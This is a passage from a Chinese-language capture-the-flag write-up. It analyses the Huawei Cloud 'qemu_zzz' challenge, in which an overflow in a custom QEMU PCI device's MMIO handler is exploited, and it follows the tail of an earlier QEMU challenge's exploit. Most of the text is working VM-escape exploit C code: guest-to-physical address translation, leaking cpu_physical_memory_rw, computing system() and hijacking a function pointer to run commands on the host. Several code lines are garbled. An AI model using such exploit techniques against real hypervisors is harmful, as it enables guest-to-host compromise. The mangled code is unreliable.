    size_t port_base = 0xc040;
    u_int32_t key[4];
    void mmio_write(size_t addr, u_int32_t val)
    {
        *(u_int32_t *)(mmio_base + addr) = val;
    }
    u_int32_t mmio_read(addr)
    {
        return *(u_int32_t *)(mmio_base + addr);
    }
    void pmio_write(size_t port, u_int32_t val)
    {
        outl(val, port_base + port);
    }
    size_t pmio_read(size_t port)
    {
        return inl(port_base + port);
    }
    size_t tea(size_t m)
    {
        uint64_t v3;
        signed int v4;   // esi
        unsigned int v5; // ecx
        uint64_t result; // rax
        v3 = m;
        v4 = -957401312;
        v5 = v3;
        result = v3 >> 32;
        do
        {
            LODWORD(result) = result - ((v5 + v4) ^ (key[3] + (v5 >> 5)) ^ (key[2] + 16 * v5));
            v5 -= (result + v4) ^ (key[1] + ((unsigned int)result >> 5)) ^ (key[0] + 16 * result);
            v4 += 1640531527;
        } while (v4);
        printf("0x%lx\n", v5);
        printf("0x%lx\n", result);
        return result > 32);
        mmio_write(0x18, t >> 32);
        // getchar();
        char *flag = "cat flag";
        tmp = tmp = *((u_int32_t *)flag + 1);
        printf("0x%lx", tmp);
        pmio_write(8, 0);
        mmio_write(0, tmp);
        tmp = *(u_int32_t *)flag;
        printf("0x%lx", tmp);
        pmio_write(28, tmp);
        return 0;
    }
###  华为云qemu_zzz
####  题目分析
打开qmeu的加载文件，可以看到其加载了一个zzz设备，漏洞就在这个设备上。
在函数中搜索zzz，可以看到zzz设备有如下几个函数
打开zzz_instance_init函数，这个函数是设备实例的初始化，可以看到他将设备实例的起始地址存放在0x19F0位置，在0x19F8位置存放cpu_physical_memory_rw函数的地址。
通过分析zzz_mmio_write函数可以大致描述处这个设备的结构
    struct ZZZState
    {
      ...
      qword rw_addr;        // 0x9e0;
      word  len ;                //0x9e8;最低位为读写标志位
      word    offset;            // 0x9ea;
      byte    buf[0x1000];//0x9f0
      qword base_addr;    //0x19f0;指向ZZZState的地址
      qword cpu_physical_memory_rw;    //0x19f8;
    }
zzz_mmio_read是通过传入的值读出buf的内容，这里意义不大。我们主要观察zzz_mmio_write
####  zzz_mmio_write
这个函数会根据传入的addr执行不同的操作，具体入下
  * 0x20：设置的读写地址rw_addr， **这里应该是虚拟机的物理地址** ，利用cpu_physical_memory_rw对其进行读写。可以实际上的地址是rw_addr*0x1000,可以mmap一个0x1000的空间，注意申请后得到的是虚拟机中的虚拟地址需要转换为虚拟机的物理地址才能够传入rw_addr。
  * 0x10：设置offset值，用cpu_physical_memory_rw读写的时候buf的偏移。
  * 0x18：设置len为读写长度，用cpu_physical_memory_rw读写的时候buf的长度，其中最低位表示是进行读操作还是写操作。
  * 0x50：会根据len和offset值对buf中的数据进行加密。
  * 0x60： **跟根据base_addr取出len和offset** ，然后掉用cpu_physical_memory_rw对buf进行读写操作。
在0x60的操作中会有一个溢出漏洞(signed int)(offset + len – 1) 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define PAGE_SHIFT 12
    #define PAGE_SIZE (1 > 9) & ~7;
        lseek(fd, offset, SEEK_SET);
        read(fd, &pme, 8);
        if (!(pme & PFN_PRESENT))
            return -1;
        gfn = pme & PFN_PFN;
        return gfn;
    }
    uint64_t gva_to_gpa(void *addr)
    {
        uint64_t gfn = gva_to_gfn(addr);
        assert(gfn != -1);
        return (gfn > 12);
        // mmio_write(0x10, 0xfff);
        // mmio_write(0x18, 0x3);
        // mmio_write(0x60, 1);
        // for (int i = 0; i < 8; i++)
        // {
        //     *(u_int8_t *)(target + i) = 0x22;
        // }
        // puts("this is write");
        // mmio_write(0x10, 0x0);//off
        // mmio_write(0x18, 0x8|1);//len
        // mmio_write(0x60, 0);
        // u_int8_t t=mmio_read(0);
        // printf("0x%lx\n",t);
        // getchar();
        puts("this is write");
        mmio_write(0x10, 0);
        mmio_write(0x18, 0xb00);
        strcpy((char *)(target + 0xa10), "cat flag\0");
        *(u_int64_t *)(target + 0x10) = pt;
        *(u_int16_t *)(target + 0x18) = 0x10 | 1;
        *(u_int16_t *)(target + 0x1a) = 0xfe0;
        mmio_write(0x60, 0);
        // getchar();
        // 修改基地址
        mmio_write(0x10, 0xfff);
        mmio_write(0x18, 2);
        *(u_int8_t *)target = 0x00;
        *(u_int8_t *)(target + 1) = 0x20;
        mmio_write(0x60, 0);
        // getchar();
        //读出cpu_physical_memory_rw
        // mmio_write(0x10, 0xff0);
        // mmio_write(0x18, 0x10 | 1);
        mmio_write(0x60, 0);
        printf("base addr 0x%lx\n", *(u_int64_t *)(target));
        printf("cpu_physical_memory_rw 0x%lx\n", *(u_int64_t *)(target + 8));
        // getchar();
        u_int64_t base = *(u_int64_t *)(target);
        u_int64_t cpu = *(u_int64_t *)(target + 8);
        u_int64_t sys = (cpu - 0x5BC5C0) + 0x2A7A80;
        printf("system addr 0x%lx\n", sys);
        //利用加密改变读写位置
        mmio_write(0x10, 0x18);
        mmio_write(0x18, 0x40);
        mmio_write(0x50, 0);
        getchar();
        puts("[*]wirte the system");
        u_int64_t sh = base - 0x20 + 0x9f0 + 0xa10;
        printf("sh addr 0x%lx\n", sh);
        getchar();
        u_int64_t new_base = (base + 0x9f0 + 0xdf0) - 0x9e0;
        printf("new_base addr 0x%lx\n", new_base);
        *(u_int64_t *)(target + 7) = sh;
        *(u_int16_t *)(target + 7 + 8) = 0;
        *(u_int16_t *)(target + 7 + 0xa) = 0x11;
        *(u_int64_t *)(target + (0x1000 - 0x20 - 0xde9)) = new_base;
        *(u_int64_t *)(target + (0x1000 - 0x20 - 0xde9 + 8)) = sys;
        mmio_write(0x60, 0);
        getchar();
        mmio_write(0x60, 0);
        return 0;
    }